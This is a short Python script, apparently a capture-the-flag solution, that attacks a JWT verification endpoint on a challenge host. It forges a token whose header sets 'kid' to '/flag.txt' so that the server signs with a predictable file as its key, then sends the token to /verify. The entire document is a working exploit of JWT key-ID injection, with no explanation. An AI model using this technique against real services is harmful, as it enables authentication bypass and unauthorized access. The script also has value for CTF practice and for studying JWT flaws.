import requests
import base64
import json

url = "http://chal1.gryphons.sg:8001"

payload = {
    "alg":"HS256",
    "kid":'/flag.txt',
    "typ":"JWT"
}

payload = base64.b64encode(json.dumps(payload).encode('utf-8')).decode().rstrip("=")

token = f"{payload}.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QifQ.xoCiZ57qIqZ-i-XWN8E_q_0jqDDrXYmW3KwD6VA4I6g"

res = requests.get(f'{url}/verify', headers={ 'Authorization': f'Bearer {token}' })

print(res.text)